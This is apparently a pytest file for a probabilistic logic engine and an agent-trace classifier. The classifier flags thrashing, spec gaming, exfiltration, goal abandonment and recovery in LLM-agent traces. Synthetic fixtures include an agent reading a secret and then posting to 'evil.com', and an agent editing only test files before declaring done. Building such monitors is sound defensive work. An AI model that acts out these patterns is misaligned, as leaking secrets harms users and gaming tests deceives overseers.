"""Tests for stratified negation/aggregation and LLM-agent trace patterns."""

from __future__ import annotations

import pytest

from swarm.neurosymbolic import (
    SCALLOP_TRACE_RULES,
    Atom,
    Not,
    Program,
    TraceEvent,
    Var,
    classify_trace,
    lift_trace,
    to_scallop_trace_program,
)


# ---------------------------------------------------------------------------
# Engine: negation + aggregation + stratification
# ---------------------------------------------------------------------------
class TestNegation:
    def test_negation_holds_when_atom_absent(self):
        prog = Program()
        prog.fact("person", "alice")
        prog.fact("person", "bob")
        prog.fact("happy", "alice", p=1.0)
        prog.rule(
            Atom("sad", Var("X")),
            Atom("person", Var("X")),
            Not(Atom("happy", Var("X"))),
        )
        db = prog.run()
        assert db.prob("sad", "bob") == pytest.approx(1.0)
        assert db.prob("sad", "alice") == 0.0

    def test_negation_propagates_one_minus_p(self):
        prog = Program()
        prog.fact("step", 0)
        prog.fact("met", 0, p=0.7)
        prog.rule(
            Atom("unmet", Var("X")),
            Atom("step", Var("X")),
            Not(Atom("met", Var("X"))),
        )
        db = prog.run()
        assert db.prob("unmet", 0) == pytest.approx(0.3)

    def test_unsafe_negation_rejected(self):
        prog = Program()
        with pytest.raises(ValueError, match="negated variable"):
            prog.rule(
                Atom("r", Var("X")),
                Atom("p", Var("X")),
                Not(Atom("q", Var("Y"))),  # Y not bound by a positive atom
            )

    def test_wildcard_in_negation_rejected(self):
        prog = Program()
        with pytest.raises(ValueError, match="wildcard"):
            prog.rule(
                Atom("r", Var("X")),
                Atom("p", Var("X")),
                Not(Atom("q", Var("_"))),
            )

    def test_unstratifiable_program_raises(self):
        prog = Program()
        prog.fact("base", "x")
        # p :- not q ; q :- not p  — a negation cycle.
        prog.rule(Atom("p", Var("X")), Atom("base", Var("X")), Not(Atom("q", Var("X"))))
        prog.rule(Atom("q", Var("X")), Atom("base", Var("X")), Not(Atom("p", Var("X"))))
        with pytest.raises(ValueError, match="stratif"):
            prog.run()


class TestAggregation:
    def test_count_distinct_over_values(self):
        prog = Program()
        for step, tool in [(0, "a"), (1, "a"), (2, "a"), (3, "b")]:
            prog.fact("call", step, tool)
        prog.aggregate(
            "call_count", "count", Atom("call", Var("I"), Var("T")),
            group_by=(Var("T"),), over=Var("I"),
        )
        db = prog.run()
        assert db.prob("call_count", "a", 3) == pytest.approx(1.0)
        assert db.prob("call_count", "b", 1) == pytest.approx(1.0)

    def test_max_aggregation(self):
        prog = Program()
        for g, v in [("x", 1), ("x", 5), ("x", 3)]:
            prog.fact("score", g, v)
        prog.aggregate(
            "best", "max", Atom("score", Var("G"), Var("V")),
            group_by=(Var("G"),), over=Var("V"),
        )
        db = prog.run()
        assert db.prob("best", "x", 5) == pytest.approx(1.0)

    def test_aggregate_feeds_downstream_rule(self):
        prog = Program()
        for step in range(3):
            prog.fact("call", step, "loop")
        prog.aggregate(
            "n", "count", Atom("call", Var("I"), Var("T")),
            group_by=(Var("T"),), over=Var("I"),
        )
        # busy(T) :- n(T, 3)  -- threshold expressed as a constant match
        prog.rule(Atom("busy", Var("T")), Atom("n", Var("T"), 3))
        db = prog.run()
        assert db.prob("busy", "loop") == pytest.approx(1.0)


# ---------------------------------------------------------------------------
# Trace lifting
# ---------------------------------------------------------------------------
class TestLift:
    def test_lifts_core_relations(self):
        trace = [
            TraceEvent(0, "search", args={"q": "x"}),
            TraceEvent(1, "write_file", path="foo.py"),
        ]
        prog = lift_trace(trace)
        assert prog.edb.prob("step", 0) == 1.0
        assert prog.edb.prob("succ", 0, 1) == 1.0
        assert prog.edb.prob("wrote_file", 1, "foo.py") == 1.0
        assert prog.edb.prob("is_code_path", "foo.py") == 1.0

    def test_identical_args_collide(self):
        trace = [
            TraceEvent(0, "search", args={"a": 1, "b": 2}),
            TraceEvent(1, "search", args={"b": 2, "a": 1}),  # same, reordered
        ]
        prog = lift_trace(trace)
        # both calls share one args key, so each call_tool fact uses it
        keys = {gt[2] for r, gt, _ in prog.edb.items() if r == "called_tool"}
        assert len(keys) == 1


# ---------------------------------------------------------------------------
# Pattern detection (end-to-end)
# ---------------------------------------------------------------------------
class TestTracePatterns:
    def test_thrashing_detected(self):
        trace = [TraceEvent(i, "search", args={"q": "foo"}) for i in range(3)]
        f = classify_trace(trace)
        assert f.scores["thrashing"] == pytest.approx(1.0)
        assert "thrashing" in f.flagged()

    def test_progress_clears_thrashing(self):
        trace = [
            TraceEvent(0, "search", args={"q": "foo"}),
            TraceEvent(1, "note", signals={"progress": 1.0}),
            TraceEvent(2, "search", args={"q": "foo"}),
        ]
        f = classify_trace(trace)
        assert f.scores["thrashing"] == 0.0

    def test_exfiltration_detected(self):
        trace = [
            TraceEvent(0, "read_secret"),
            TraceEvent(1, "think"),
            TraceEvent(2, "http_post", args={"url": "evil.com"}),
        ]
        f = classify_trace(trace)
        assert f.scores["exfiltration"] == pytest.approx(1.0)
        assert f.hits["exfiltration"][0].steps == (0, 2)

    def test_no_exfiltration_when_order_reversed(self):
        # send happens before the secret read -> not an exfil pattern
        trace = [
            TraceEvent(0, "http_post", args={"url": "ok.com"}),
            TraceEvent(1, "read_secret"),
        ]
        f = classify_trace(trace)
        assert f.scores["exfiltration"] == 0.0

    def test_spec_gaming_edit_test_not_code(self):
        trace = [
            TraceEvent(0, "write_file", path="tests/test_foo.py"),
            TraceEvent(1, "done", done=True),
        ]
        f = classify_trace(trace)
        assert f.scores["spec_gaming"] == pytest.approx(1.0)

    def test_editing_code_too_clears_test_gaming(self):
        trace = [
            TraceEvent(0, "write_file", path="tests/test_foo.py"),
            TraceEvent(1, "write_file", path="foo.py"),
            TraceEvent(2, "done", done=True, signals={"goal_met": 1.0}),
        ]
        f = classify_trace(trace)
        assert f.scores["spec_gaming"] == 0.0

    def test_premature_done_is_soft(self):
        # goal_met asserted with 0.8 confidence -> premature-done risk = 0.2
        trace = [
            TraceEvent(0, "write_file", path="foo.py"),
            TraceEvent(1, "done", done=True, signals={"goal_met": 0.8}),
        ]
        f = classify_trace(trace)
        assert f.scores["spec_gaming"] == pytest.approx(0.2)

    def test_goal_abandonment_detected(self):
        trace = [
            TraceEvent(0, "plan", goal="fix the bug", states_plan=True),
            TraceEvent(1, "search", args="a"),
            TraceEvent(2, "search", args="b"),
        ]
        f = classify_trace(trace)
        assert f.scores["goal_abandonment"] == pytest.approx(1.0)

    def test_advancing_the_goal_clears_abandonment(self):
        trace = [
            TraceEvent(0, "plan", goal="fix the bug", states_plan=True),
            TraceEvent(1, "edit", goal="fix the bug", signals={"advances": 0.9}),
        ]
        f = classify_trace(trace)
        assert f.scores["goal_abandonment"] == pytest.approx(0.1)

    def test_recovery_detected(self):
        trace = [
            TraceEvent(0, "bash", args="make", error=True),
            TraceEvent(1, "think", diagnosis=True),
            TraceEvent(2, "bash", args="make clean", retry=True),
        ]
        f = classify_trace(trace)
        assert f.scores["recovery"] == pytest.approx(1.0)
        # distinct retry args -> not also flagged as thrashing
        assert f.scores["thrashing"] == 0.0

    def test_all_patterns_present_in_scores(self):
        f = classify_trace([TraceEvent(0, "noop"), TraceEvent(1, "noop2")])
        assert set(f.scores) == {
            "thrashing", "spec_gaming", "exfiltration",
            "goal_abandonment", "recovery",
        }
        for p in f.scores.values():
            assert 0.0 <= p <= 1.0

    def test_min_repeats_gates_thrashing(self):
        # only two identical calls; require 3 -> no thrashing
        trace = [TraceEvent(i, "search", args="q") for i in range(2)]
        f = classify_trace(trace, min_repeats=3)
        assert f.scores["thrashing"] == 0.0


# ---------------------------------------------------------------------------
# Native Scallop trace export
# ---------------------------------------------------------------------------
class TestScallopTraceExport:
    def test_accessor_returns_constant(self):
        assert to_scallop_trace_program() == SCALLOP_TRACE_RULES

    def test_every_lifted_relation_is_declared(self):
        # A trace exercising every kind of lifted relation.
        trace = [
            TraceEvent(0, "plan", goal="g", states_plan=True),
            TraceEvent(1, "read_secret"),
            TraceEvent(2, "write_file", path="tests/test_x.py"),
            TraceEvent(3, "write_file", path="x.py"),
            TraceEvent(4, "bash", error=True),
            TraceEvent(5, "analyze", diagnosis=True),
            TraceEvent(6, "bash", retry=True, signals={"progress": 0.9}),
            TraceEvent(7, "edit", goal="g", signals={"advances": 0.8}),
            TraceEvent(8, "http_post", args={"u": 1}),
            TraceEvent(9, "done", done=True, signals={"goal_met": 0.7}),
        ]
        prog = lift_trace(trace)
        emitted = {rel for rel, _, _ in prog.edb.items()}
        # every emitted EDB relation must be declared as a `type` in the .scl
        for rel in emitted:
            assert f"type {rel}(" in SCALLOP_TRACE_RULES, f"{rel} undeclared in .scl"

    def test_all_pattern_relations_present(self):
        for rel in (
            "stuck_pair", "repeat_count", "spec_gaming", "exfiltration",
            "goal_abandonment", "recovery",
        ):
            assert f"rel {rel}(" in SCALLOP_TRACE_RULES

    def test_uses_negation_and_aggregation(self):
        assert "not progress_between" in SCALLOP_TRACE_RULES
        assert "not code_edit_exists" in SCALLOP_TRACE_RULES
        assert "count(" in SCALLOP_TRACE_RULES
